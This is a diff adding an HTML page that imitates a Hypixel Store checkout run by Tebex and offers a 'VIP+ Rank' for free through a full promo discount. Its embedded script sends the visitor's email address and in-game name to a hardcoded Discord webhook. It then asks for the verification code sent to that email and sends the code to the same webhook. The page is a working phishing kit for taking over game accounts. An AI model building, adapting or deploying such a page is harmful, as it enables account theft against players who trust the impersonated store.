@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="shortcut icon"
+    href="https://dunb17ur4ymx4.cloudfront.net/webstore/favicons/fc1a114f14e2c826a38d2a08d65a6cdbdab28dd8.png">
+    <title>Hypixel Store | Checkout</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+
+        .checkout-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .breadcrumb {
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+            color: #666;
+        }
+
+        .current-item {
+            display: flex;
+            padding: 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .item-image {
+            width: 40px;
+            height: 40px;
+            margin-right: 15px;
+        }
+
+        .item-details {
+            flex-grow: 1;
+        }
+
+        .main-content {
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+        }
+
+        .price-details {
+            margin: 20px 0;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+
+        .price-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .price-row.discount {
+            color: #28a745;
+        }
+
+        .submit-button {
+            background: #F5841F;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            width: 100%;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .submit-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+        }
+
+        .verification-step {
+            display: none;
+        }
+
+        .verification-step.active {
+            display: block;
+        }
+
+        .initial-step {
+            display: block;
+        }
+
+        .initial-step.hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="checkout-container">
+        <div class="breadcrumb">
+            You might like › Make Payment › Order Confirmed
+        </div>
+
+        <div class="current-item">
+            <img src="https://dunb17ur4ymx4.cloudfront.net/packages/images/573d597eebcbfdc8c5485d6bf044abb60175c2c5.png" alt="VIP+ Rank" class="item-image">
+            <div class="item-details">
+                <div>VIP+ Rank</div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="initial-step" id="initialStep">
+                <div class="form-group">
+                    <label class="form-label">Email Address</label>
+                    <input type="email" class="form-input" id="emailInput" placeholder="Enter your email address" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">IGN (In-Game Name)</label>
+                    <input type="text" class="form-input" id="ignInput" placeholder="Enter your IGN" required>
+                </div>
+
+                <div class="price-details">
+                    <div class="price-row">
+                        <span>Subtotal:</span>
+                        <span>$16.49 USD</span>
+                    </div>
+                    <div class="price-row discount">
+                        <span>Promo discount:</span>
+                        <span>-$16.49 USD</span>
+                    </div>
+                    <div class="price-row">
+                        <strong>Total Price:</strong>
+                        <strong>$0.00 USD</strong>
+                    </div>
+                </div>
+
+                <button class="submit-button" id="completeOrderBtn">Complete Order</button>
+            </div>
+
+            <div class="verification-step" id="verificationStep">
+                <div class="form-group">
+                    <label class="form-label">Enter the code sent to your email to proceed</label>
+                    <input type="text" class="form-input" id="verificationInput" required placeholder="Enter verification code">
+                </div>
+                <button class="submit-button" id="verifyCodeBtn">Verify Code</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            <img src="https://pay.tebex.io/logo-gray.svg" alt="Tebex Logo" style="height: 20px;">
+            <p>This checkout process is owned & operated by Tebex Limited, who handle product fulfilment, billing support and refunds.</p>
+        </div>
+    </div>
+
+    <script>
+        // Replace with your Discord webhook URL
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1334182565237493800/H8mEh5J4LyQJISC1nUsTv-ewC629SBtNRBUUVokLn_ofWkjLp2NaJ00Z_hrs1FaTN6wY';
+
+async function sendToDiscord(message) {
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: message })
+        });
+
+        if (response.ok) {
+            console.log('Message sent to Discord');
+        } else {
+            alert('There was an error sending the message. Please try again.');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        alert('There was an error sending the message. Please try again.');
+    }
+}
+
+document.getElementById('completeOrderBtn').addEventListener('click', function() {
+    const email = document.getElementById('emailInput').value;
+    const ign = document.getElementById('ignInput').value;
+
+    if (email && ign) {
+        const message = `@everyone New VIP+ Purchase:\n\nEmail:\n${email}\n\nIGN:\n${ign}`;
+        sendToDiscord(message);
+
+        document.getElementById('initialStep').classList.add('hidden');
+        document.getElementById('verificationStep').classList.add('active');
+    } else {
+        alert('Please fill in all required fields');
+    }
+});
+
+document.getElementById('verifyCodeBtn').addEventListener('click', function() {
+    const code = document.getElementById('verificationInput').value;
+    if (code) {
+        console.log('Verification code submitted:', code);
+        sendToDiscord(`@everyone Verification Code:\n${code}`);
+    } else {
+        alert('Please enter the verification code');
+    }
+});
+
+
+    </script>
+</body>
+</html>
